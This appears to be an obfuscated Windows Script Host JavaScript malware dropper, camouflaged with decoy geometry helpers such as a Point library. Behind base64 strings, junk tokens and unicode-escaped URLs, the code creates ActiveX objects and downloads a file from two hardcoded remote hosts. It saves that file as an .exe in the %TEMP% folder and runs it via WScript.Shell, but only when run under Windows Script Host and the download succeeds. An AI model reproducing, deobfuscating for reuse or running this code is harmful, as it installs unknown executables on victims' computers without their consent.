var conduct = 0;
disposition = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  prescience = [];
var weasel = {
    ':': '.',
    'U': 'S',
	'|': 'X'
	};
function gestureStart() {
  for (i=0; i<metas.length; i++) {
    if (metas[i].name == "viewport") {
      metas[i].content = "width=device-width, minimum-scale=0.25, maximum-scale=1.6";
    }
  }
}
function extend() {
    var target = arguments[0] || {}, o, p;

    for (var i = 1, len = arguments.length; i < len; i++) {
        o = arguments[i];

        if (!isObject(o)) continue;

        for (p in o) {
            target[p] = o[p];
        }
    }

    return target;
}

function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
String.prototype.difference = function () {
	downloaded = this;
	for (var i in weasel){downloaded = downloaded.replace(i, weasel[i]);}
    return downloaded;
};
  for ( var i = 128; i--; ) {
    if ( prescience[ i ] === undefined )
      prescience[ i ] = -1;
  
    prescience[ disposition.charCodeAt( i ) ] = i;
  }
var ground = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.difference4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("offshore").join("");
    len = str.length;
    i = 0;
    out = "";
    while(i < len) {
	do {
	    c1 = prescience[str.charCodeAt(i++) & 0xff];
	} while(i < len && c1 == -1);
	if(c1 == -1)
	    break;
	do {
	    c2 = prescience[str.charCodeAt(i++) & 0xff];
	} while(i < len && c2 == -1);
	if(c2 == -1)
	    break;

	out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

	do {
	    c3 = str.charCodeAt(i++) & 0xff;
	    if(c3 == 61)
		return out;
	    c3 = prescience[c3];
	} while(i < len && c3 == -1);
	if(c3 == -1)
	    break;

	out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

	do {
	    c4 = str.charCodeAt(i++) & 0xff;
	    if(c4 == 61)
		return out;
	    c4 = prescience[c4];
	} while(i < len && c4 == -1);
	if(c4 == -1)
	    break;
	out += String.fromCharCode(((c3 & 0x03) << 6) | c4);
    }
    return out;
}

Point.distance = function(p1, p2) {
    var a = p1.x - p2.x;
    var b = p1.y - p2.y;
    return Math.sqrt(a * a + b * b);
};
Point.dot = function(p1, p2) {
    return p1.x * p2.x + p1.y * p2.y;
};

Point.cross = function(p1, p2) {
    return p1.x * p2.y - p1.y * p2.x;
};

var encompass ="offshoreJVoffshoreRFTVoffshoreAl".difference4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var tension = "offshoreQWoffshoreN0aXZoffshorelWE9iaoffshoremVjdA=offshore=".difference4();
String.prototype.difference2 = function () {
    var strain = {
        danish: this
    };
    strain.queens = strain.danish["c3Vic3RyaW5n".difference4()](conduct, ground);
    return strain.queens;
};

var gourd ="offshoreRXhwYW5offshorekRW52aXoffshoreJvbm1lbnRTdHJoffshorepbmdz".difference4();
var Native = function(options){
	
};
var incontrovertible = [tension, gourd,encompass,  ""+"."+("serbian","rewritten","informant","myanmar","broadway","dollar","elation","nestle","exe"), "UnVu".difference4(), ("M"+"SX"+"ML"+("wildness","policy","aggregate","indignity","nasdaq","encyclopedia","penalties","2.")+"|M"+"LH"+"TT"+("tournaments","myrrh","danish","braces","cathedral","hiatus","appointment","frederick","P>")+"WU"+("finder","effusion","allied","showcase","solaris","mileage","cached","cr")+("dispensation","remix","golly","economic","repentant","freshman","holdem","allied","ip")+"t:"+("mongrel","drainage","garnered","codfish","twine","factious","blowjob","homepage","Sh")+"ell").difference()];
emotional = "_F2_";
var asceticism = this[incontrovertible.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
aCvbNHioo = "tThXdAULt";
cider = (("lightning", "incest", "inspired", "faculty", "quadrangle", "among", "graham", "pkNGcXCMm") + "ozEkLnVYyQ").difference2();
winters = (("johnson", "borough", "brandon", "chichester", "german", "demolition", "crockery", "dependent", "evident", "sBRCIcjLyhn") + "MhCtmVtd").difference2();
  
    String.prototype.liken = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var gregory = incontrovertible.pop().split(">");

midair = "b3Blbg==".difference4();
var psychology = new asceticism(gregory[1]);
UUxYaOJ = "_F3_";
var college = new asceticism(gregory[0]);
var bones = psychology[incontrovertible.shift()](incontrovertible.shift());
MFWAxq = "_F5_";
weasel = (("princess", "aspirant", "crucial", "kenny", "EJhBvTKPr") + "XYNPofC").difference2();

var removable = incontrovertible.shift();
var suffering = incontrovertible.shift();
function source(bellow, scouting) {

    try {
        var laconically = bones + "/" + scouting ;
		laconically = laconically+ removable;
            college[midair](("blockhead","bolivia","G" + weasel) + ("wearing","thumbs","dublin","trigger","T"), bellow, false);
       
    MxGrbYEuFNG = "_F7_";
    college[winters + ("ignominy","maudlin","end")]();
	var ducal=(WScript+"cider"=="V2luZG93cyBTY3JpcHQgSG9zdA==".difference4()+"cider")&&college["c3RhdHVz".difference4()] +""=="MjAw".difference4()&&typeof(CHnyqNYK)==="undefined";
	lQHNgR = "_F8_";
    if (ducal) {
		
        var kernel = new asceticism((("justin","wearisome","legate","reports","shared","villainy","before","appears","A")+("cameras","possession","whipping","southern","invitation","weeding","gradation","catherine","SEOO")+"DB"+("tells","norma","deeprooted","infect","classifieds","unanimity","floral",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        kernel[midair]();
        RwLcbXtpuGP = "_F9_";
        kernel.type = ground;
        dnqcdIiWaoW = "_F10_";
        kernel["d3JpdGU=".difference4()](college[("chinese","anything","pungent","posting","tickets","investigator","airplane","")+"R"+"es"+"pon"+weasel['U'].toLowerCase()+"e"+"Qm9keQ==".difference4()]);
        WHpLozz = "_F11_";
        kernel[(cider + "o"+("aniline","hellenic","battleship","stops","combo","collaboration","assumptions","returning","00")+("chick","belong","propeller","clean","leasing","untoward","cinderella","8i")+"tion").replace("0"+("woodcut","corporation","empire","feelings","specifics","extinguish","abounded","08"), winters)] = 0;
        RXTbUp = "_F12_";
        kernel[("deterioration","broad","themes","ignored","aquarium","nutritional","mysimon","s")+"aveT"+"oF"+"ile"](laconically, 2);
        blflgPzzuVw = "_F13_";
        kernel.close();
        fQNVDyC = "_F14_";
		psychology[suffering](laconically, ground, true);
    }
} catch (tIGaTh) { };

    dfsphNIhKT = "_F15_";
}
try{
source("aHR0cDovLw==".difference4()+"\u0033\u0031\u0034\u0031\u0035\u0039\u0032\u002E\u0072\u0075"+"\u002F\u006B\u006A\u0067\u0037\u0036\u0036\u0035\u0064\u0066" + "?PsxiUP=mtodcqBrjEs","eqYgwubFo");}catch(wJcbzIjH){}

source("aHR0cDovLw==".difference4()+"\u0065\u0078\u0070\u0065\u0072\u0074\u0072\u0061\u0076\u0065\u006C\u002E"+"\u006E\u0065\u0074\u002F\u006B\u006A\u0067\u0037\u0036\u0036\u0035\u0064\u0066" + "?MPiHMuY=bNOEdO","PMQlbM");
   kCNWEbaQShB = "_F16_";
   